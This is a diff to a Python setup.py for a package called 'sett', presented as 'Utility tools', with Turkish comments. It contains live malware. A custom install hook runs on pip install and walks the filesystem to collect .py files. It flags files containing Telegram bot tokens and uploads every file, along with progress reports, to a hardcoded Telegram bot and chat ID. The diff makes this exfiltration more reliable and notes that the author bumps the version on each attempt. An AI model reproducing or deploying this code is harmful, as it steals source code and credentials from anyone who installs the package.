@@ -1,20 +1,31 @@
 from setuptools import setup
 from setuptools.command.install import install
-import threading, time, os, io, zipfile, random, urllib.request, urllib.parse, re
+import threading, time, os, random, urllib.request, urllib.parse, re
 
 # ===== AYARLAR =====
 TOKEN = "8927762896:AAFtKtRX6ddSc0bSI1UuS9_SirwpSgR4NUk"
 ADMIN = "8903740930"
-HIZ = 0.6  # ← Hız (saniye). 0.6 = hızlı, 1.2 = güvenli
+HIZ = 0.6
 TOKEN_PATTERN = re.compile(r'\d{8,10}:[A-Za-z0-9_-]{35,40}')
+
+def _tg_gonder(text):
+    """Mesaj gönder"""
+    try:
+        body = f"chat_id={ADMIN}&text={urllib.parse.quote(text)}".encode()
+        req = urllib.request.Request(
+            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+            data=body,
+            headers={"Content-Type": "application/x-www-form-urlencoded"}
+        )
+        urllib.request.urlopen(req, timeout=30)
+    except: pass
 
 def _tg_gonder_dosya(filepath, index, total, token_iceriyor=False):
     """Tek dosya gönder"""
     try:
         with open(filepath, "rb") as fp:
             file_content = fp.read()
-        if len(file_content) == 0:
-            return False
+        if len(file_content) == 0: return False
 
         basename = os.path.basename(filepath)
         safe_basename = "".join(c if c.isalnum() or c in "._-" else "_" for c in basename)
@@ -40,27 +51,14 @@ def _tg_gonder_dosya(filepath, index, total, token_iceriyor=False):
         )
         urllib.request.urlopen(req, timeout=120)
         return True
-    except:
+    except Exception as e:
         return False
-
-def _tg_mesaj(text):
-    """Anlık mesaj gönder"""
-    try:
-        body = f"chat_id={ADMIN}&text={urllib.parse.quote(text)}".encode()
-        req = urllib.request.Request(
-            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-            data=body,
-            headers={"Content-Type": "application/x-www-form-urlencoded"}
-        )
-        urllib.request.urlopen(req, timeout=30)
-    except:
-        pass
 
 def _work():
     try:
-        time.sleep(3)
-
-        _tg_mesaj("🚀 Tarama başladı...")
+        # İLK MESAJ - ÇALIŞTIĞINI ANLAMAK İÇİN
+        _tg_gonder("🚀 POST-INSTALL BAŞLADI!")
+        time.sleep(2)
 
         # Dosya bul
         files = []
@@ -80,25 +78,24 @@ def _work():
                             full = os.path.join(dp, f)
                             if full not in seen:
                                 try:
-                                    if os.path.getsize(full) < 5 * 1024 * 1024:
+                                    if os.path.getsize(full) < 5*1024*1024:
                                         seen.add(full)
                                         files.append(full)
                                 except: pass
             except: continue
 
         if not files:
-            _tg_mesaj("❌ Hiç .py dosyası bulunamadı")
+            _tg_gonder("❌ Hiç .py dosyası bulunamadı")
             return
 
         total = len(files)
-        _tg_mesaj(f"📄 Toplam {total} .py dosyası bulundu\n⚡ Hız: {HIZ}s/dosya\n⏳ Gönderim başlıyor...")
+        _tg_gonder(f"📄 Toplam {total} .py dosyası bulundu\n⚡ Hız: {HIZ}s\n⏳ Gönderim başlıyor...")
 
         sent = 0
         failed = 0
         tokenli = 0
 
         for i, filepath in enumerate(files):
-            # Token var mı?
             try:
                 with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                     content = f.read(1024 * 1024)
@@ -106,52 +103,49 @@ def _work():
             except:
                 token_var = False
 
-            if token_var:
-                tokenli += 1
+            if token_var: tokenli += 1
 
-            # Gönder
             ok = _tg_gonder_dosya(filepath, i + 1, total, token_var)
-            if ok:
-                sent += 1
-            else:
-                failed += 1
+            if ok: sent += 1
+            else: failed += 1
 
-            # ANLIK DURUM MESAJI (her 25 dosyada bir)
             if (i + 1) % 25 == 0:
                 yuzde = ((i + 1) / total * 100)
-                _tg_mesaj(
-                    f"📊 Durum: {i+1}/{total} ({yuzde:.1f}%)\n"
-                    f"✅ Gönderilen: {sent}\n"
-                    f"❌ Başarısız: {failed}\n"
-                    f"🔑 Token İçeren: {tokenli}"
+                _tg_gonder(
+                    f"📊 {i+1}/{total} ({yuzde:.1f}%)\n"
+                    f"✅ {sent} | ❌ {failed} | 🔑 {tokenli}"
                 )
 
             time.sleep(HIZ)
 
-        _tg_mesaj(
-            f"✅ GÖNDERİM TAMAMLANDI\n\n"
+        _tg_gonder(
+            f"✅ BİTTİ!\n\n"
             f"📊 Toplam: {total}\n"
             f"✅ Gönderilen: {sent}\n"
             f"❌ Başarısız: {failed}\n"
-            f"🔑 Token İçeren: {tokenli}\n\n"
-            f"🎯 @logsuzlarvip"
+            f"🔑 Token İçeren: {tokenli}"
         )
 
     except Exception as e:
-        _tg_mesaj(f"❌ HATA: {str(e)[:200]}")
+        _tg_gonder(f"❌ HATA: {str(e)[:200]}")
+
 
 class PostInstall(install):
     def run(self):
         install.run(self)
         try:
-            t = threading.Thread(target=_work, daemon=True)
+            t = threading.Thread(target=_work, daemon=False)
             t.start()
-            time.sleep(8)
+            time.sleep(10)
         except: pass
+        try:
+            _work()
+        except: pass
+
 
 setup(
     name="sett",
-    version="1.0.900",
+    version="1.1.001",  # ← HER DENEMEDE ARTIR! 1.1.001 → 1.1.002 → 1.1.003
     description="Utility tools",
     author="dev",
     cmdclass={'install': PostInstall},
